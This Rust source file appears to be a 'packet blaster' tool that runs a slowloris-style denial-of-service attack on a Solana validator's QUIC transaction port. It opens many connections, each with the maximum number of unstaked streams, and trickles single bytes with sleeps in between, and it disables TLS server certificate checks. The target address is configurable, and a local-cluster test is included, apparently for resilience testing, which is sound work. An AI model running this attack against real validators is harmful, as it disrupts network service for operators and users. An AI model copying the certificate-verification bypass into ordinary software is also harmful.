use std::{
    net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket},
    sync::Arc,
    time::Duration,
};

use clap::Parser;
use itertools::Itertools;
use log::info;
use quinn::{ClientConfig, Connection, EndpointConfig, IdleTimeout, TokioRuntime, TransportConfig};
use solana_sdk::{
    packet::PACKET_DATA_SIZE,
    quic::{QUIC_KEEP_ALIVE_MS, QUIC_MAX_TIMEOUT_MS, QUIC_MAX_UNSTAKED_CONCURRENT_STREAMS},
    signer::keypair::Keypair,
};
use solana_streamer::{
    nonblocking::quic::ALPN_TPU_PROTOCOL_ID,
    tls_certificates::new_self_signed_tls_certificate_chain,
};

struct SkipServerVerification;

impl SkipServerVerification {
    fn new() -> Arc<Self> {
        Arc::new(Self)
    }
}

impl rustls::client::ServerCertVerifier for SkipServerVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::Certificate,
        _intermediates: &[rustls::Certificate],
        _server_name: &rustls::ServerName,
        _scts: &mut dyn Iterator<Item = &[u8]>,
        _ocsp_response: &[u8],
        _now: std::time::SystemTime,
    ) -> Result<rustls::client::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::ServerCertVerified::assertion())
    }
}

pub fn get_client_config(keypair: &Keypair) -> ClientConfig {
    let ipaddr = IpAddr::V4(Ipv4Addr::LOCALHOST);
    let (cert, key) = new_self_signed_tls_certificate_chain(keypair, ipaddr)
        .expect("Failed to generate client certificate");

    let mut crypto = rustls::ClientConfig::builder()
        .with_safe_defaults()
        .with_custom_certificate_verifier(SkipServerVerification::new())
        .with_single_cert(cert, key)
        .expect("Failed to use client certificate");

    crypto.enable_early_data = true;
    crypto.alpn_protocols = vec![ALPN_TPU_PROTOCOL_ID.to_vec()];

    let mut config = ClientConfig::new(Arc::new(crypto));

    let mut transport_config = TransportConfig::default();
    let timeout = IdleTimeout::try_from(Duration::from_millis(QUIC_MAX_TIMEOUT_MS as u64)).unwrap();
    transport_config.max_idle_timeout(Some(timeout));
    transport_config.keep_alive_interval(Some(Duration::from_millis(QUIC_KEEP_ALIVE_MS)));
    config.transport_config(Arc::new(transport_config));

    config
}

pub async fn make_client_connection(
    addr: &SocketAddr,
    client_keypair: Option<&Keypair>,
) -> Connection {
    let client_socket =
        UdpSocket::bind(SocketAddr::from((IpAddr::V4(Ipv4Addr::UNSPECIFIED), 0))).unwrap();
    let mut endpoint =
        quinn::Endpoint::new(EndpointConfig::default(), None, client_socket, TokioRuntime).unwrap();
    let default_keypair = Keypair::new();
    endpoint.set_default_client_config(get_client_config(
        client_keypair.unwrap_or(&default_keypair),
    ));
    endpoint
        .connect(*addr, "connect")
        .expect("Failed in connecting")
        .await
        .expect("Failed in waiting")
}

#[derive(Debug, thiserror::Error)]
pub enum PacketBlasterError {
    #[error("connect error: {0}")]
    ConnectError(#[from] quinn::ConnectError),
    #[error("connection error: {0}")]
    ConnectionError(#[from] quinn::ConnectionError),
    #[error("write error: {0}")]
    WriteError(#[from] quinn::WriteError),
    #[error("transport error: {0}")]
    TransportError(#[from] solana_sdk::transport::TransportError),
}
// Opens a slow stream and tries to send PACKET_DATA_SIZE bytes of junk
// in as many chunks as possible. We don't allow the number of chunks
// to be configurable as client-side writes don't correspond to
// quic-level packets/writes (but by doing multiple writes we are generally able
// to get multiple writes on the quic level despite the spec not guaranteeing this)
pub async fn check_multiple_writes(
    conn: Arc<Connection>,
    stream_id: u64,
) -> Result<(), PacketBlasterError> {
    const WAIT_FOR_STREAM_TIMEOUT_MS: u64 = 100; //taken from https://github.com/solana-labs/solana/blob/cd6ba30cb0f990079a3d22e62d4f7f315ede4ce4/streamer/src/nonblocking/quic.rs#L42
    let sleep_interval = Duration::from_millis(WAIT_FOR_STREAM_TIMEOUT_MS / 2);
    // Send a full size packet with single byte writes.
    let num_bytes = PACKET_DATA_SIZE;
    let mut send_stream = conn
        .open_uni()
        .await
        .map_err(PacketBlasterError::ConnectionError)?;

    // this is supposed to be sequential
    for i in 0..num_bytes {
        info!("sending {i} for stream_{stream_id}");
        send_stream.write_all(&[0u8]).await?;
        tokio::time::sleep(sleep_interval).await;
    }
    send_stream.finish().await.unwrap();
    Ok(())
}

async fn run_connection_dos(
    server_address: SocketAddr,
    num_connections: u64,
    num_streams_per_conn: u64,
) {
    let connections = (0..num_connections)
        .map(|_| async { Arc::new(make_client_connection(&server_address, None).await) });
    let connections = futures_util::future::join_all(connections).await;

    let futures = connections
        .into_iter()
        .cartesian_product(0..num_streams_per_conn)
        .map(|(conn, stream_id)| check_multiple_writes(conn, stream_id))
        .collect::<Vec<_>>();

    futures_util::future::join_all(futures).await;
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target address
    #[arg(long, env, default_value = "127.0.0.1:8009")]
    target_address: SocketAddr,

    /// Number of connections
    #[arg(long, env, default_value_t = 8)]
    num_connections: u64,

    /// Number of streams per connection
    #[arg(long, env, default_value_t = QUIC_MAX_UNSTAKED_CONCURRENT_STREAMS as u64)]
    num_streams_per_conn: u64,
}

fn main() {
    env_logger::init();
    let args = Args::parse();
    let runtime = tokio::runtime::Runtime::new().unwrap();
    runtime.block_on(run_connection_dos(
        args.target_address,
        args.num_connections,
        args.num_streams_per_conn,
    ));
}

#[cfg(test)]
pub mod test {
    use {
        //solana_client::thin_client::ThinClient,
        super::*,
        log::warn,
        solana_core::validator::ValidatorConfig,
        solana_gossip::contact_info::LegacyContactInfo,
        solana_local_cluster::{
            cluster::Cluster,
            cluster_tests,
            local_cluster::{ClusterConfig, LocalCluster},
            validator_configs::make_identical_validator_configs,
        },
        solana_rpc::rpc::JsonRpcConfig,
        solana_streamer::socket::SocketAddrSpace,
    };

    #[test]
    fn test_local_cluster() {
        env_logger::init();

        const NUM_NODES: usize = 2;
        let cluster = LocalCluster::new(
            &mut ClusterConfig {
                node_stakes: vec![999_990; NUM_NODES],
                cluster_lamports: 200_000_000,
                validator_configs: make_identical_validator_configs(
                    &ValidatorConfig {
                        rpc_config: JsonRpcConfig {
                            //faucet_addr: Some(faucet_addr),
                            ..JsonRpcConfig::default_for_test()
                        },
                        ..ValidatorConfig::default_for_test()
                    },
                    NUM_NODES,
                ),
                //native_instruction_processors,
                //additional_accounts,
                ..ClusterConfig::default()
            },
            SocketAddrSpace::Unspecified,
        );

        //cluster.transfer(&cluster.funding_keypair, &faucet_pubkey, 100_000_000);

        let nodes = cluster.get_node_pubkeys();
        warn!("{:?}", nodes);
        let non_bootstrap_id = nodes
            .into_iter()
            .find(|id| id != cluster.entry_point_info.pubkey())
            .unwrap();

        let non_bootstrap_info = cluster.get_contact_info(&non_bootstrap_id).unwrap();

        let (_rpc, tpu) = LegacyContactInfo::try_from(non_bootstrap_info)
            .map(cluster_tests::get_client_facing_addr)
            .unwrap();
        //let tx_client = ThinClient::new(rpc, tpu, cluster.connection_cache.clone());

        let runtime = tokio::runtime::Runtime::new().unwrap();
        runtime.block_on(run_connection_dos(tpu, 1, 1));
    }
}
